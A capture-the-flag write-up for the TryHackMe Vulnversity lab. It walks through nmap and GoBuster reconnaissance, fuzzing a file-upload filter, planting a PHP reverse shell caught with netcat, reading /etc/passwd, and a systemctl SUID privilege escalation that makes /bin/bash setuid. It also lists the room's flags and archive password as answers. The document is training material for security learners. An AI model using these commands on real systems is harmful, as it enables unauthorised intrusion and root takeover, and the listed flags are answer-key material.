# Vulnversity

Learn about active recon, web app attacks and privilege escalation.

[Vulnversity](https://tryhackme.com/room/vulnversity)

## Topic's

- Network Enumeration
- Web Enumeration
- Exploitation Upload
- Abusing SUID/GUID

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Deploy the machine

Connect to our network and deploy this machine. If you are unsure on how to get connected, complete the [OpenVPN room](https://tryhackme.com/room/openvpn) first.

1. Deploy the machine

`No answer needed`

## Reconnaissance

Gather information about this machine using a network scanning tool called `nmap`.

Don't have a Linux machine with nmap on? Deploy your own [Kali machine](https://tryhackme.com/room/kali) and control it with your browser.

1. Scan this box: `nmap -sV <machines ip>`

![](https://i.imgur.com/gZqOO8D.png)

nmap is an free, open-source and powerful tool used to discover hosts and services on a computer network. In our example, we are using nmap to scan this machine to identify all services that are running on a particular port. nmap has many capabilities, below is a table summarising some of the functionality it provides.

| nmap flag     | Description                                                                         |
| ------------- | ----------------------------------------------------------------------------------- |
| -sV           | Attempts to determine the version of the services running                           |
| -p <x> or -p- | Port scan for port <x> or scan all ports                                            |
| -Pn           | Disable host discovery and just scan for open ports                                 |
| -A            | Enables OS and version detection, executes in-build scripts for further enumeration |
| -sC           | Scan with the default nmap scripts                                                  |
| -v            | Verbose mode                                                                        |
| -sU           | UDP port scan                                                                       |
| -sS           | TCP SYN port scan                                                                   |

There are many nmap "cheatsheets" online that you can use too.

`No answer needed`

2. Scan the box, how many ports are open?

```
sudo nmap -sS -sC -sV -oN nmap_initial.log 10.10.233.148

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 20:26 CEST
Nmap scan report for 10.10.233.148
Host is up (0.042s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2020-09-24T14:26:36-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-09-24T18:26:37
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.28 seconds
```

`6`

3. What version of the squid proxy is running on the machine?

`3.5.12`

4. How many ports will nmap scan if the flag -p-400 was used?

`400`

5. Using the nmap flag -n what will it not resolve?

`DNS`

6. What is the most likely operating system this machine is running?

`Ubuntu`

7. What port is the web server running on?

`3333`

8. Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)

## Locating directories using GoBuster

Using a fast directory discovery tool called GoBuster you will locate a directory that you can use to upload a shell to.

1. Lets first start of by scanning the website to find any hidden directories. To do this, we're going to use GoBuster.

![](https://i.imgur.com/gODlTeh.png)

GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.

Download GoBuster [here](https://github.com/OJ/gobuster), or if you're on Kali Linux 2020.1+ run `sudo apt-get install gobuster`

To get started, you will need a wordlist for GoBuster (which will be used to quickly go through the wordlist to identify if there is a public directory available. If you are using [Kali Linux](https://tryhackme.com/room/kali) you can find many wordlists under `/usr/share/wordlists`.

Now lets run GoBuster with a wordlist: `gobuster dir -u http://<ip>:3333 -w <word list location>`

| GoBuster flag     | Description                               |
| ----------------- | ----------------------------------------- |
| -e                | Print the full URLs in your console       |
| -u                | The target URL                            |
| -w                | Path to your wordlist                     |
| -U and -P         | Username and Password for Basic Auth      |
| -p <x>            | Proxy to use for requests                 |
| -c <http cookies> | Specify a cookie for simulating your auth |

2. What is the directory that has an upload form page?

`gobuster dir -u "http://10.10.233.148:3333" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

## Compromise the webserver

Now you have found a form to upload files, we can leverage this to upload and execute our payload that will lead to compromising the web server.

1. Try upload a few file types to the server, what common extension seems to be blocked?

`.php`

2. To identify which extensions are not blocked, we're going to fuzz the upload form.

To do this, we're doing to use **BurpSuite**. If you are unsure to what BurpSuite is, or how to set it up please complete our [BurpSuite room](https://tryhackme.com/room/rpburpsuite) first.

![](https://i.imgur.com/j71CW1A.png)

3. We're going to use Intruder (used for automating customised attacks).

To begin, make a wordlist with the following extensions in:

![](https://i.imgur.com/ED153Nx.png)

Now make sure BurpSuite is configured to intercept all your browser traffic. Upload a file, once this request is captured, send it to the Intruder. Click on "Payloads" and select the "Sniper" attack type.

Click the "Positions" tab now, find the filename and "Add §" to the extension. It should look like so:

![](https://i.imgur.com/6dxnzq6.png)

Run this attack, what extension is allowed?

`.phtml`

4. Now we know what extension we can use for our payload we can progress.

We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and have your shell executed which will beacon out to you to control!

Download the following reverse PHP shell [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

To gain remote access to this machine, follow these steps:

1. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to http://10.10.10.10 in the browser of your TryHackMe connected device).
2. Rename this file to php-reverse-shell.phtml
3. We're now going to listen to incoming connections using netcat. Run the following command: `nc -lvnp 1234`
4. Upload your shell and navigate to `http://<ip>:3333/internal/uploads/php-reverse-shell.phtml` - This will execute your payload
5. You should see a connection on your netcat session

![](https://i.imgur.com/FGcvTCp.png)

```
nc -lvnp 9001

```

5. What is the name of the user who manages the webserver?

```
python -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
cat /etc/passwd
```

`bill`

6. What is the user flag?

```
cat /home/bill/user.txt
```

`8bd7992fbe8a6ad22a63361004cfcedb`

## Privilege Escalation

Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).

1. In Linux, SUID **(set owner userId upon execution)** is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.

![](https://i.imgur.com/ZhaNR2p.jpg)

On the system, search for all SUID files. What file stands out?

```
find / -perm -4000 2> /dev/null

/bin/systemctl
```

2. Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer? Become root and get the last flag (/root/root.txt)

`https://gtfobins.github.io/`

`https://gtfobins.github.io/gtfobins/systemctl/`

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

`bash -p`

`a58ff8579f0a9270368d33a9966c7fd5`
